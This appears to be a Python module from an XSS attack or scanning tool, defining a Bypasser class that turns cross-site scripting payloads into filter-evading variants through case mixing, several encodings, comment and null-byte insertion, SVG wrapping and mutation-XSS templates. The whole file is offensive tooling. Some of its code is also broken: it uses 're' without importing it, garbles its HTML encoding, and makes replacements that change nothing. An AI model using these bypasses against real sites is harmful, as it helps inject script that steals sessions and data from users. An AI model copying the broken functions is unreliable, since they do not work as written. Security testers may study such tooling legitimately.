"""
XSS Bypass Techniques Module
"""

from typing import List, Dict, Optional, Callable
from ..utils.encoder import Encoder


class Bypasser:
    def __init__(self):
        self.encoder = Encoder()
        self.bypass_techniques = {
            'none': self.bypass_none,
            'case_mixed': self.bypass_case_mixed,
            'html_encoding': self.bypass_html_encoding,
            'url_encoding': self.bypass_url_encoding,
            'double_url_encoding': self.bypass_double_url_encoding,
            'unicode_escape': self.bypass_unicode_escape,
            'comment_insertion': self.bypass_comment_insertion,
            'null_byte': self.bypass_null_byte,
            'hex_encoding': self.bypass_hex_encoding,
            'unicode_js': self.bypass_unicode_js,
            'svg_alt': self.bypass_svg_alt,
            'mutation': self.bypass_mutation,
        }

    def bypass_none(self, payload: str) -> List[str]:
        return [payload]

    def bypass_case_mixed(self, payload: str) -> List[str]:
        results = []
        mixed = []
        upper = True
        for char in payload:
            if char.isalpha():
                mixed.append(char.upper() if upper else char.lower())
                upper = not upper
            else:
                mixed.append(char)
        results.append(''.join(mixed))
        if '<script>' in payload.lower():
            results.append(payload.replace('<script>', '<ScRiPt>').replace('</script>', '</ScRiPt>'))
            results.append(payload.replace('<script>', '<SCRIPT>').replace('</script>', '</SCRIPT>'))
        if '<img' in payload.lower():
            results.append(payload.replace('<img', '<IMG').replace('onerror', 'oNeRrOr'))
            results.append(payload.replace('<img', '<ImG').replace('onerror', 'OnErRoR'))
        if '<svg' in payload.lower():
            results.append(payload.replace('<svg', '<SVG').replace('onload', 'oNlOaD'))
            results.append(payload.replace('<svg', '<SvG').replace('onload', 'OnLoAd'))
        if '<body' in payload.lower():
            results.append(payload.replace('<body', '<BODY').replace('onload', 'oNlOaD'))
        return results

    def bypass_html_encoding(self, payload: str) -> List[str]:
        results = []
        for char in payload:
            if char.isalnum():
                results.append(f'&#{ord(char)};')
            else:
                results.append(char)
        results.append(''.join(f'&#{ord(c)};' for c in payload))
        return [''.join(results)]

    def bypass_url_encoding(self, payload: str) -> List[str]:
        encoded = self.encoder.url_encode(payload)
        parts = payload.split('<')
        if len(parts) > 1:
            partial_encoded = '<'.join([self.encoder.url_encode(p) if i > 0 else p for i, p in enumerate(parts)])
            return [encoded, partial_encoded]
        return [encoded]

    def bypass_double_url_encoding(self, payload: str) -> List[str]:
        return [self.encoder.double_url_encode(payload)]

    def bypass_unicode_escape(self, payload: str) -> List[str]:
        return [self.encoder.unicode_encode(payload)]

    def bypass_comment_insertion(self, payload: str) -> List[str]:
        results = []
        results.append(re.sub(r'(<)(\w+)', r'\1\2', payload.replace('<script>', '<scr<!-->ipt>')))
        results.append(re.sub(r'(</)(\w+)', r'\1\2', payload.replace('</script>', '</scr<!-->ipt>')))
        results.append(payload.replace('<script>', '<script>//'))
        results.append(payload.replace('<script>', '<script><!--'))
        results.append(payload.replace('<script>', '<!--<script>>'))
        results.append(re.sub(r'(>)', r'\\1', payload.replace('<script>', '<script>')))
        results.append(re.sub(r'(<)(\w+)', r'\1\2', payload.replace('<img', '<img')))
        if 'onerror' in payload.lower():
            results.append(payload.replace('onerror', 'onerror\x00'))
            results.append(payload.replace('onerror', 'onerror'))
        return results

    def bypass_null_byte(self, payload: str) -> List[str]:
        results = []
        results.append(payload + '\x00')
        results.append('\x00' + payload)
        parts = payload.split('<')
        if len(parts) > 1:
            null_parts = []
            for i, part in enumerate(parts):
                if i > 0:
                    null_parts.append('\x00<' + part)
                else:
                    null_parts.append(part)
            results.append(''.join(null_parts))
        return results

    def bypass_hex_encoding(self, payload: str) -> List[str]:
        return [self.encoder.hex_encode(payload)]

    def bypass_unicode_js(self, payload: str) -> List[str]:
        return [self.encoder.unicode_js_escape(payload)]

    def bypass_svg_alt(self, payload: str) -> List[str]:
        results = []
        alt_tags = {
            '<script>': '<svg><script>',
            '</script>': '</script></svg>',
            '<img': '<svg><img',
            'onerror': 'onload',
        }
        result = payload
        for original, replacement in alt_tags.items():
            result = result.replace(original.lower(), replacement)
        results.append(result)
        if '<script>' in payload.lower():
            results.append(payload.replace('<script>', '<svg><script>').replace('</script>', '</script></svg>'))
        if '<img' in payload.lower():
            results.append(payload.replace('<img', '<svg><img').replace('onerror', 'onload'))
        return results

    def bypass_mutation(self, payload: str) -> List[str]:
        results = []
        results.append(f"<noscript><p title='</noscript><img src=x onerror={payload}>'>")
        results.append(f"<style><img src=x onerror={payload}></style>")
        results.append(f"<!--<img src='--><img src=x onerror={payload}//-->")
        results.append(f"<![CDATA[><script>{payload}</script>]]>")
        return results

    def apply_bypass(self, payload: str, technique: str) -> List[str]:
        if technique in self.bypass_techniques:
            return self.bypass_techniques[technique](payload)
        return [payload]

    def apply_all_bypasses(self, payload: str) -> List[Dict]:
        results = []
        for technique_name, technique_func in self.bypass_techniques.items():
            bypassed_payloads = technique_func(payload)
            for bp in bypassed_payloads:
                results.append({
                    'original': payload,
                    'bypassed': bp,
                    'technique': technique_name
                })
        return results

    def get_available_techniques(self) -> List[str]:
        return list(self.bypass_techniques.keys())

    def smart_bypass(self, payload: str, context: str = 'html') -> List[str]:
        techniques_map = {
            'html': ['none', 'case_mixed', 'html_encoding', 'comment_insertion', 'svg_alt'],
            'attribute': ['none', 'html_encoding', 'case_mixed', 'mutation'],
            'javascript': ['none', 'unicode_js', 'unicode_escape', 'case_mixed'],
            'url': ['none', 'url_encoding', 'double_url_encoding', 'hex_encoding'],
            'style': ['none', 'comment_insertion', 'null_byte'],
        }
        techniques = techniques_map.get(context, ['none', 'case_mixed', 'html_encoding'])
        results = []
        for technique in techniques:
            if technique in self.bypass_techniques:
                results.extend(self.bypass_techniques[technique](payload))
        return results
